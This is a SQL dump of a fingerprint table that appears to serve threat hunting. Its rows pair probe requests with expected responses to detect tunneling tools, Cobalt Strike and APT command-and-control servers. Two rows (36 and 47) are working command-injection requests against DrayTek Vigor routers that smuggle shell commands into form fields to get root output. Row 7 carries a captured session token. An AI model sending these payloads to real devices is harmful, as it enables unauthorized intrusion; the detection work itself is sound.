CREATE TABLE IF NOT EXISTS `probe_info` (
  `probe_id` int(11) NOT NULL AUTO_INCREMENT,
  `probe_name` varchar(255) NOT NULL,
  `probe_group` varchar(50) NOT NULL DEFAULT '0',
  `probe_tags` varchar(255) NOT NULL,
  `probe_protocol` varchar(255) NOT NULL,
  `probe_match_type` varchar(255) NOT NULL,
  `probe_send` longtext NOT NULL,
  `probe_recv` longtext NOT NULL,
  `probe_desc` varchar(255) NOT NULL DEFAULT '',
  `probe_create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `probe_update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `sys` tinyint(1) NOT NULL DEFAULT '0',
  `is_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`probe_id`)
) ENGINE=InnoDB AUTO_INCREMENT=80 DEFAULT CHARSET=utf8;

INSERT INTO `probe_info` (`probe_id`, `probe_name`, `probe_group`, `probe_tags`, `probe_protocol`, `probe_match_type`, `probe_send`, `probe_recv`, `probe_desc`, `probe_create_time`, `probe_update_time`, `sys`, `is_deleted`) VALUES
	(1, 'termite', '内网穿透', '后门', 'TCP', 'keyword', '010000000900000000000000ff000000ff0000000000000000000000000000000200000000000000060000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002141fa120380ffff020000000000000000000000000000000000000000000000300000005b000000e0be05edfc7f0000000000000000000000000000000000006e000000770000000000000000000000dfbe05edfc7f00000000000000000000efbe05edfc7f000000000000000000007c0000000000000000000000000000007c0000000380ffff60a78e28307f00009140fa120380ffffd602000000000000b50000000000000060a78e28307f000001000000000000000013400000000000d0c105edfc7f0000000000000000000000000000000000008c875a28307f000000000000000000005001d328307f00001900000000000000967140000000000080bf05edfc7f0000a7c3400000000000-0000000001000000010000001200000054686973206e6f64652069732041646d696e00000000000000000000000000006e000000770000000000000000000000dfbe05edfc7f00000000000000000000efbe05edfc7f000000000000000000007c0000000000000000000000000000007c0000000380ffff60a78e28307f00009140fa120380ffffd602000000000000b50000000000000060a78e28307f000001000000000000000013400000000000d0c105edfc7f0000000000000000000000000000000000008c875a28307f000000000000000000005001d328307f00001900000000000000967140000000000080bf05edfc7f0000a7c3400000000000ffffffff0000000000b8ff9f9552d6e4b0bf05edfc7f00001d6e40000000000050b3af0000000000c0b3af00-01000000', '5468697320436c69656e74204e6f6465', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(2, 'gortcp', '内网穿透', '后门', 'TCP', '==', '010000000900000000000000ff000000ff0000000000000000000000000000000200000000000000060000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002141fa120380ffff020000000000000000000000000000000000000000000000300000005b000000e0be05edfc7f0000000000000000000000000000000000006e000000770000000000000000000000dfbe05edfc7f00000000000000000000efbe05edfc7f000000000000000000007c0000000000000000000000000000007c0000000380ffff60a78e28307f00009140fa120380ffffd602000000000000b50000000000000060a78e28307f000001000000000000000013400000000000d0c105edfc7f0000000000000000000000000000000000008c875a28307f000000000000000000005001d328307f00001900000000000000967140000000000080bf05edfc7f0000a7c3400000000000-0000000001000000010000001200000054686973206e6f64652069732041646d696e00000000000000000000000000006e000000770000000000000000000000dfbe05edfc7f00000000000000000000efbe05edfc7f000000000000000000007c0000000000000000000000000000007c0000000380ffff60a78e28307f00009140fa120380ffffd602000000000000b50000000000000060a78e28307f000001000000000000000013400000000000d0c105edfc7f0000000000000000000000000000000000008c875a28307f000000000000000000005001d328307f00001900000000000000967140000000000080bf05edfc7f0000a7c3400000000000ffffffff0000000000b8ff9f9552d6e4b0bf05edfc7f00001d6e40000000000050b3af0000000000c0b3af00-01000000', '0700000019534552564552204552524f523a2061757468206572726f720a', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(3, 'fuso', '内网穿透', '后门', 'TCP', 're', '0500000040000000a2-a4000000f09330819f300d06092a864886f70d010101050003818d0030818902818100e42b643814d3b9006fc4fbd6f50c5ace6aaedd2e5ea940ee8d8d1143c9a014d08ad7820c836f7bc355ba96db20f8d4830d52ed8373325e2b398b432e7cac71c4da3613c91a93791c285699fb38f405110ceee5922f2d515fb2af979df6fa324407489d55974338c33f38721d113d5b7dae7843f3b7913c29717ddbbb217db4430203010001', '^0500000040000000a2a4000000f09330819f300d06092a864886f70d010101050003818d0030818902818100', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(4, 'gost', '内网穿透', '后门', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: close', 'Proxy-Agent: gost', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(5, 'frp-tcp', '内网穿透', '后门', 'TCP', 'keyword', '9a1fdc41ffedd3648a038f23c6e08774-00000000000000010000000b-5096d592ef438333af4cee-000000000000000100000010-94b2af7a914cd002ae67f519288a2fe0000000000000000100000043', '000100020000000100000000', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(6, 'frp-http', '内网穿透', '后门', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: close', 'https://github.com/fatedier/frp', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(7, 'nps-backend', '内网穿透', '后门', 'HTTP', 'keyword', 'GET /login/index HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\nCookie: crocodile=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTE3NDgwNDQsImlzcyI6ImNyb2NvZGlsZSIsIlVJRCI6IjYxNTI2MDI4OTgxMzcxMjg5NiIsIlVzZXJOYW1lIjoiencifQ.awkN0Xi69Dj35xtG91zfXCqsCuV_jtf242D0sGhvkkI; sidebarStatus=1; beegosessionID=a5d50b513506f895491f9788a6820347; lang=zh-CN\r\nHost: 192.168.56.132:8080\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36', 'window.nps', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(8, 'nps-http', '内网穿透', '后门', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: close', 'nps error', '', '2022-02-07 10:19:00', '2023-09-07 09:42:10', 1, 0),
	(9, 'IN方向响尾蛇-C2特征', '响尾蛇', 'C2', 'HTTP', 'cert', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', 'cert_issuer_o:Let\'s Encrypt', '', '2023-08-11 16:44:50', '2023-09-08 03:27:46', 1, 0),
	(10, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /healthne/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(11, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutspph/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK\n<span>Password', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(12, 'BITTER-代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /imgLog.jpg HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(13, 'APT32-Remy-c协议特征-2', 'APT32', 'C2', 'TCP', 'keyword', '02', '5e5c78303324', '', '2022-06-21 17:52:27', '2023-09-08 03:59:20', 1, 0),
	(14, 'APT-C-23-木马托管', 'APT-C-23', 'C2', 'HTTP', 'keyword', 'GET /F5YVWRDBbnsghWe6lN4DSRedB2FsVU1Q/download__________.zip HTTP/1.1\\r\\n\\r\\n', '504b0304', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(15, 'LazarusAPT-代码特征', 'Lazarus Group', 'C2', 'HTTP', 'keyword', 'GET /tmp/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(16, 'BITTER-木马HTTP特征', 'BITTER', '木马C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutspph/ HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: close\\r\\n\\r\\n', '<span>password', '', '2023-08-04 10:12:22', '2023-09-08 03:27:55', 1, 0),
	(17, 'bitter-协议特征', 'BITTER', 'C2', 'TCP', '==', '4f5445774d454e424d4545324d6b56464e446c42516b4e425155564451554533513046424d304e425154524451554e4251304534516b4e424f45564451546733513045344d304e424f445244515555335130453551554e424f446c4451554e42513045344e304e4251544e4451554535513046434f454e425154564451554935513046424e554e4251554e4451554a465130464651554e424f5552445155457a513046424e454e4251555644515545315130464352454e42516a6c44515556425130464752454e425255464451554a42513046434f454e4251545644515556425130464451554e42526b4e4451555a46513046464e304e42515468445155457a5130464352554e425130464451555a43513046474f454e42526a424451555a42513045344f554e42526a424451555935513046474d6b4e42526a424451555a4651304647516b4e42526a424451555979513045344d454e42526a424451555a425130464752554e425130464451555935513046464e454e42526b464451554e425130453d', '', '', '2022-06-21 17:52:27', '2023-09-15 08:05:35', 1, 0),
	(18, 'SideWinder-代码特征-5', '响尾蛇', 'C2', 'HTTP', 'keyword', 'GET /1/2/3/4/5 HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 404 Not Found\nContent-Length: 13\nConnection: keep-alive\nContent-Type: text/html; charset=utf-8\nServer: nginx/1.14.0 (Ubuntu)\nVary: Accept-Encoding\n\n404 Not Found', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(19, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /RguhsT/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(20, 'Bitter-health-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /healthne/accept.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(21, 'Bitter-代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ergdfbd/wscspl HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(22, 'Bitter-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutsphp/tstPerHyPfilbmiw1.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(23, 'APT组织载荷工具-CobaltStrike-2', '载荷工具', '载荷、工具', 'TCP', 'keyword', '4f5054494f4e5320485454502f312e310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a', '323030204f4b20262620416c6c6f77', '', '2023-08-11 11:15:26', '2023-09-08 03:59:34', 1, 0),
	(24, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /RsdvgiMincSnyYu/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK\n<span>Password', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(25, 'APT37-木马托管', 'APT37', 'C2', 'HTTP', 'keyword', 'GET /swfupload/fla/1.jpg HTTP/1.1\\r\\n\\r\\n', '42 32 44 38 31 43 41 46 45', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(26, 'DarkHotel-代码片段', 'DarkHotel', 'C2', 'HTTP', 'keyword', 'POST /724882-4428-47219-2472-2474-177129429842/6126.php?vol=admin&q=O2NFa8JZ2&guid={29cd9ds2-1942-24jd-9e2n-983huk49md1} HTTP/1.1\\r\\n\\r\\n', 'rest', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(27, 'Confucius-代码特征', 'Confucius', 'C2', 'HTTP', 'keyword', 'POST /p.php HTTP/1.1\\r\\nAccept: */*\\r\\nCache-Control: no-cache\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\\r\\nContent-Length: 0\\r\\nConnection: Keep-Alive\\r\\n\\r\\n', '{"ip":"', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(28, 'Bitter-代码特征-3', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutsphp/tstPerHyPfilbmiwts2t.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(29, 'VN方向海莲花C2跳板Vigor路由器', 'APT32', 'C2、跳板', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', 'Server: DWS', '', '2023-08-11 10:46:43', '2023-09-08 03:27:55', 1, 0),
	(30, 'Bitter-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /RsdvgiMincSnyYu/PerHyPfilbmiw1.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(31, 'APT32-Remy-协议特征-1', 'APT32', 'C2', 'TCP', 're', '00000000', '^5c7833305c7830305c7830305c7830302e.{3330}', '', '2022-06-21 17:52:27', '2023-09-08 04:01:12', 1, 0),
	(32, 'Bitter-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ourtyaz/dwnack.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(33, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ergdfbd/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(34, 'APT组织载荷工具-CobaltStrike-3', '载荷工具', '载荷、工具', 'TCP', 're', '474554202f20485454502f312e310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a', '5c7831355c7830335c7830335c7830305c7830325c783032', '', '2023-08-11 11:04:06', '2023-09-08 06:15:56', 1, 0),
	(35, 'Kimsuky代码特征', 'Kimsuky', 'C2', 'HTTP', 'keyword', 'GET //?m=a&p1=a0390e08&p2=Win10.0.19042x64-D_Regsvr32-v2.0.23 HTTP/1.1\\r\\nAccept: text/html, application/xhtml+xml, */*\\r\\nAccept-Language: en-US\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\\r\\nAccept-Encoding: gzip, deflate\\r\\nDNT: 1\\r\\nConnection: Keep-Alive\\r\\n\\r\\n', 'X-Request-ID', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(36, 'VN方向海莲花C2跳板Vigor路由器漏洞1', '路由器漏洞', 'CVE-2020-8515', 'HTTP', 'keyword', 'POST /cgi-bin/mainfunction.cgi HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4476.0 Safari/537.36\\r\\nContent-Type: text/plain; charset=UTF-8\\r\\nAccept: */*\\r\\nContent-Length: 264\\r\\nConnection: close\\r\\n\\r\\naction=login&keyPath=%27%0aid%0a%27&loginUser=CgWSQiPBBo2HdxGYYcJXYSHXx7hkCQZDt65CEKRpnrRqXP8ZsVsVKaLsTet+nGzOTW67DxX7PIr5as/TogOSJQ==&loginPwd=kl5j42XAohdTTGOn19Cof4uqx+psCMmdGusyFM2SeW2Hwcz53FdnAEDYR6B4/PcBmqZDD2uprmtdhP8+LdIDkA==&formcaptcha=bnVsbA==&rtick=null', 'uid=0(root)', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(37, 'Bitter-tst-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutspph/tstPerHyPfilbmiw1.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(38, 'Bitter-代码特征-3', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ourtyaz/qwe.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(39, 'Bitter-代码特征-4', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ourtyaz/qwf.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(40, 'APT28-Wellmess-木马指纹', 'APT28', 'C2', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\n\\r\\n', 'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain; charset=utf-8\r\nConnection: close\r\n\r\n400 Bad Request', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(41, 'Bitter-tst-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutsphp/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK\n<span>Password', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(42, 'APT28-Wellmess-木马指纹-2', 'APT28', 'C2', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\n\\r\\n', 'HTTP/1.1 200 OK && Content-Type: text/plain; charset=utf-8 && Content-Length: 0', '', '2023-08-10 18:31:07', '2023-09-08 03:27:55', 1, 0),
	(43, 'OA', '通达OA', 'test', 'HTTP', 'keyword', 'GET /inc/expired.php HTTP/1.1\\r\\nConnection: keep-alive\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\n\\r\\n', 'HTTP/1.1 200 OK', '', '2022-07-04 17:27:42', '2023-09-08 03:27:55', 1, 0),
	(44, 'Biiter-代码特征-3', 'BITTER', 'C2', 'HTTP', '==', 'GET /inc/expired.php HTTP/1.1\\r\\nHost: 211.144.138.150\\r\\nConnection: keep-alive\\r\\nCache-Control: max-age=0\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\n\\r\\n', '', '', '2022-06-21 17:52:27', '2023-09-15 08:05:24', 1, 0),
	(45, '蓝宝菇-木马托管', 'APT-C-12', '跳板', 'HTTP', 'keyword', 'GET /ding1/ding1.htz HTTP/1.1\\r\\n\\r\\n', 'csript', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(46, 'BITTER-代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /LoginPageNew.html HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'index1Auth.php', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(47, 'VN方向海莲花C2跳板Vigor路由器漏洞3', '路由器漏洞', 'CVE-2020-14993', 'HTTP', 'keyword', 'POST /cgi-bin/mainfunction.cgi HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4476.0 Safari/537.36\\r\\nContent-Type: text/plain; charset=UTF-8\\r\\nContent-Length: 285\\r\\nAccept: */*\\r\\nConnection: close\\r\\n\\r\\naction=authusersms&custom1=1;&custom2=1&custom3=1&formuserphonenumber=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xEC\\xC7\\x01&URL=www.baidu.com&HOST=123456897&serverip=";id;echo \'123\';&filename=pwn', 'uid=0(root)', '', '2023-08-10 15:38:45', '2023-09-08 03:27:55', 1, 0),
	(48, 'StrongPity-代码特征', 'PROMETHIUM', 'C2', 'HTTP', 'keyword', 'GET /sy.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(49, 'APT组织载荷工具-CobaltStrike-1', '载荷工具', '载荷、工具', 'TCP', 'keyword', '47455420485454502f312e310d0a436f6e6e656374696f6e3a20636c6f73650d0a0d0a', '5c7831355c7830335c7830335c7830305c7830325c783032', '', '2023-08-11 11:01:51', '2023-09-08 04:01:28', 1, 0),
	(50, 'StrongPity-代码片段', 'StrongPity', 'C2', 'HTTP', 'keyword', 'GET /sys.php HTTP/1.1\\r\\nUser-Agent: Go-http-client/1.1 Cookie: name=WIN-6SB954B2725_WIN-6SB954B2725_Titans\\r\\nAccept-Encoding: gzip\\r\\n\\r\\n', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(51, 'CIA-Athena', 'CIA', 'C2', 'HTTP', 'keyword', 'GET /keyword=%s&matchtype=p HTTP/1.1\\r\\nUser-Agent: Go-http-client/1.1\\r\\nCookie: session-id=28lKM19\\r\\nAccept-Encoding: gzip\\r\\n\\r\\n', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(52, 'Bitter-代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /healthne/regdl HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(53, 'valogin-代码特征', '响尾蛇', 'C2', 'HTTP', 'keyword', 'GET /v2login/ HTTP/1.1\nCache-Control: max-age=0\nSec-Ch-Ua: &quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/7.0 (Windows NT 6.0; Win32; x32) AppleWebKit/53.36 (KHTML, like Gecko) Chrome/77.0.4495.0 Safari/53.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close', '200\nContent-Length: 6802', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
